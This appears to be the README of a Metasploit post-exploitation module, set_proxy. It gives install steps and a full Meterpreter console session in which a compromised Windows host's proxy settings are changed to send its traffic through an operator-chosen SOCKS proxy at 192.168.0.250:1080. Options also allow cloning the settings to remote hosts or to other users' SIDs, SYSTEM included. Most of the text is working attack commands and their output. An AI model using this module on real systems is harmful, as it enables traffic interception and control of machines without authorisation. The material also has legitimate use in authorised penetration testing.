metasploit-set-proxy
==========================
Version 1.0 - Feedback welcome (surefire@unallocatedspace.org)

set-proxy Meterpreter module (formerly configure-proxy)

To install, place in your ~/msf4/modules/post/windows/manage folder, then:

```
meterpreter > background
[*] Backgrounding session 8...
msf> use post/windows/manage/set_proxy
msf  post(set_proxy) > show options

Module options (post/windows/manage/set_proxy):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AUTOCONFIG                      yes       Enable/disable AutoConfig. ("Use automatic configuration script")
   AUTOCONFIGURL                   no        Provide URL to configuration file for AutoConfig functionality
   ENABLE                          yes       Enable/disable proxy server. ("Use a proxy server for your LAN")
   EXCEPTIONS                      no        Exclude proxying for hosts beginning with (semicolon-delimited).  Use "<local>" to "Bypass Proxy Server for Local Addresses"
   FTPPROXY                        no        Provide HOST:PORT setting of proxy server for FTP protocols
   HTTPPROXY                       no        Provide HOST:PORT setting of proxy server for HTTP protocols
   HTTPSPROXY                      no        Provide HOST:PORT setting of proxy server for HTTPS protocols
   RHOST                           no        Remote host to clone settings to, defaults to local
   SESSION                         yes       The session to run this module on.
   SID                             no        SID of user to clone settings to (SYSTEM is S-1-5-18)
   SINGLEPROXY                     no        Provide HOST:PORT setting of proxy server for all protocols
   SOCKSPROXY                      no        Provide HOST:PORT setting of proxy server for SOCKS protocols
   WPAD                            yes       Enable/disable WPAD. ("Automatically detect settings")

msf  post(set_proxy) > set SESSION 6
SESSION => 6
msf  post(set_proxy) > set ENABLE true
ENABLE => true
msf  post(set_proxy) > set WPAD false
WPAD => false
msf  post(set_proxy) > set AUTOCONFIG false
AUTOCONFIG => false
msf  post(set_proxy) > set SOCKSPROXY 192.168.0.250:1080
SOCKSPROXY => 192.168.0.250:1080
msf  post(set_proxy) > show options

Module options (post/windows/manage/set_proxy):

   Name           Current Setting     Required  Description
   ----           ---------------     --------  -----------
   AUTOCONFIG     false               yes       Enable/disable AutoConfig. ("Use automatic configuration script")
   AUTOCONFIGURL                      no        Provide URL to configuration file for AutoConfig functionality
   ENABLE         true                yes       Enable/disable proxy server. ("Use a proxy server for your LAN")
   EXCEPTIONS                         no        Exclude proxying for hosts beginning with (semicolon-delimited).  Use "<local>" to "Bypass Proxy Server for Local Addresses"
   FTPPROXY                           no        Provide HOST:PORT setting of proxy server for FTP protocols
   HTTPPROXY                          no        Provide HOST:PORT setting of proxy server for HTTP protocols
   HTTPSPROXY                         no        Provide HOST:PORT setting of proxy server for HTTPS protocols
   RHOST                              no        Remote host to clone settings to, defaults to local
   SESSION        6                   yes       The session to run this module on.
   SID                                no        SID of user to clone settings to (SYSTEM is S-1-5-18)
   SINGLEPROXY                        no        Provide HOST:PORT setting of proxy server for all protocols
   SOCKSPROXY     192.168.0.250:1080  no        Provide HOST:PORT setting of proxy server for SOCKS protocols
   WPAD           false               yes       Enable/disable WPAD. ("Automatically detect settings")

msf  post(set_proxy) > run

[*] ----- PREVIOUS SETTINGS -----
[*] Proxy Counter: 1
[*] Proxy Setting: WPAD (9)
[*] -----   NEW SETTINGS   -----
[*] Proxy Counter: 1
[*] Proxy Setting: Proxy server (3)
[*] Proxy Server:  socks=192.168.0.250:1080;

[*] Post module execution completed
msf  post(set_proxy) > 
```
